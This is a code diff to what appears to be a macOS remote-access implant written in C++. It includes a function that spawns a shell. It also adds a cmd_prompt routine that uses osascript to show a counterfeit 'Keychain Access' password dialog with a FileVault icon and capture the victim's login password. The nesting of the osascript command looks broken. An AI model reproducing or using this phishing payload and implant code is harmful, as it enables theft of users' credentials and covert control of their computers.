@@ -120,7 +120,7 @@ void cmd_cat(std::vector<std::string> commands)
 
 void cmd_shell()
 {
-    system("/bin/sh -i");
+    system("/bin/sh");
 }
 
 void cmd_pwd()
@@ -197,8 +197,12 @@ void cmd_help()
         counter++;
     }
 
-    console_log("");
-    console_log("  exit, quit");
+    if (counter % 5 != 0)
+        console_log(" exit");
+    else {
+        console_log("");
+        console_log("  exit");
+    }
     console_log("");
 }
 
@@ -228,5 +232,16 @@ void cmd_say(std::vector<std::string> commands)
 
 void cmd_getvol()
 {
+    console_log_information("Current volume level: ");
+    sleep(1);
     system("osascript -e 'output volume of (get volume settings)'");
+}
+
+void cmd_prompt()
+{
+    std::string payload = "osascript -e 'set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer'";
+
+    console_log_information("Obtained password: ");
+    sleep(1);
+    system(("osascript -e '" + payload + "'").c_str());
 }
